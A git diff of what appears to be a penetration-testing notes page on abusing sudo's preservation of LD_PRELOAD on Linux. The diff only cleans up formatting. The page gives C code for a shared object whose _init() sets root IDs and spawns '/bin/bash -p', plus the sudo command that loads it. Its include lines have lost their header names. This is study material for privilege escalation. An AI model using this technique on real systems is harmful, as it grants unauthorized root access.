@@ -1,6 +1,6 @@
 # LD\_PRELOAD
 
-LD\_PRELOAD is an environment variable which can be set to the path of a shared object \(.so\) file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init\(\) function, we can execute code as soon as the object is loaded.
+LD\_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.
 
 ## Limitations
 
@@ -14,16 +14,16 @@ Note that the env\_keep option includes the LD\_PRELOAD environment variable.
 
 ![](../../../../.gitbook/assets/env1.png)
 
-Create a file \(preload.c\) with the following contents:
+Create a file (preload.c) with the following contents:
 
-`#include  
- #include  
- #include  
- void _init() {  
- unsetenv("LD_PRELOAD");  
- setresuid(0,0,0);  
- system("/bin/bash -p");  
- }`
+`#include`\
+` #include`\
+` #include`\
+` void _init() {`\
+` unsetenv("LD_PRELOAD");`\
+` setresuid(0,0,0);`\
+` system("/bin/bash -p");`\
+` }`
 
 Compile preload.c to preload.so:
 
@@ -34,8 +34,6 @@ Run any allowed program using sudo, while setting the LD\_PRELOAD environment va
 `sudo LD_PRELOAD=/tmp/preload.so apache2`
 
 ![](../../../../.gitbook/assets/env2.png)
-
-
 
 
 
